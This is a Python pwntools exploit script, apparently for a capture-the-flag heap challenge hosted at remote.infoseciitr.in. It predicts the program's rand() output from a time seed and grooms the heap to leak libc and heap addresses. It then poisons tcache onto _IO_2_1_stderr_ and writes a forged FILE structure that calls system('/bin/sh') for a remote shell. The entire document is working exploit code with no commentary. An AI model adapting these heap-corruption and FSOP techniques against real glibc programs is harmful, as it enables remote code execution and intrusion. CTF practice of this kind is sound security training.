#!/usr/bin/env python3
from pwn import *
import time, ctypes

exe  = context.binary = ELF(args.EXE or './chall')
libc = ELF(exe.libc.path)

def rand(): io.sendlineafter(b'>> ', b'2')

def create(idx, pattern):
  io.sendlineafter(b'>> ', b'1')
  io.sendlineafter(b'>> ', str(idx).encode())
  io.sendlineafter(b': ', pattern)

def delete(idx):
  io.sendlineafter(b'>> ', b'3')
  io.sendlineafter(b'>> ', str(idx).encode())

def wait(target):
    global rndm_table, rndm_index
    while rndm_table[rndm_index] != target:
        rand() ; rndm_index += 1
    rndm_index += 1

io = remote("remote.infoseciitr.in", 8006) ; ts = int(time.time())

c_lib      = ctypes.CDLL("libc.so.6"); c_lib.srand(ts)
rndm_index = 0 ; rndm_table = [c_lib.rand() % 8 for _ in range(0x10000)]

for i in range(8): wait(0) ; create(i, b"amaterasu")
for i in [*(i for i in range(7, -1, -1) if i != 2), 2]: delete(i)

io.sendlineafter(b'>> ', b'4')
io.sendlineafter(b'>> ', b'0'*0xffff + b'1')

for i in range(2): wait(0) ; create(i, b"amaterasu")

delete(0)
wait  (5) ; create(0, b'.?'*(0x18//2) + p8(0xe0) + b'?')

io.sendlineafter(b'>> ', b'4')
io.sendlineafter(b'>> ', b'1')

io.recvuntil(b"your spell >> ")
leaks = io.recvline()
libc.address = u64(leaks[0x20:0x28]) - 0x203b30
heap_base    = u64(leaks[0xc0:0xc8]) << 12

delete(0)
wait  (5) ; create(0, b'.?'*(0x18//2) + p8(0x21) + b'?')

for i in range(2, 8): wait(0) ; create(i, b"amaterasu")
for i in range(8): delete(i)

for i in [*(i for i in range(7, -1, -1) if i != 2), 2]: wait(0) ; create(i, b"amaterasu")

delete(1)
wait  (5) ; create(1, b'.?'*(0x18//2) + p8(0xf1) + b'?')

delete(3)
wait  (5) ; create(3, b'.?'*(0x18//2) + p8(0xf1) + b'?')

delete(4) ; delete(2)

delete(0)
wait  (5) ; create(0, b'.?'*(0x18//2) + p8(0x31) + b'?')
delete(1)

io.sendlineafter(b'>> ', b'5')
io.sendlineafter(b'>> ', b'0')

io.sendlineafter(b'>> ', b'40')
io.sendlineafter(b': ', p64(0)*3 + p64(0xf1) + p64(libc.sym._IO_2_1_stderr_ ^ (heap_base >> 12)))

fs  = b"/bin/sh\x00" + p64(0)*2 + p64(libc.sym.system)
fs += p64(0)*13 + p64(libc.address + 0x205700)
fs += p64(0)*2  + p64(libc.sym._IO_2_1_stderr_ - 0x20)
fs += p64(0)*3  + p64(libc.sym._IO_2_1_stderr_)
fs += p64(0)*2  + p64((libc.symbols['_IO_wfile_jumps'] + 0x48) - 0x18)

io.sendlineafter(b'>> ', b'6')
io.sendlineafter(b'>> ', b'A'*0x8)
io.sendlineafter(b'>> ', fs)
io.interactive()
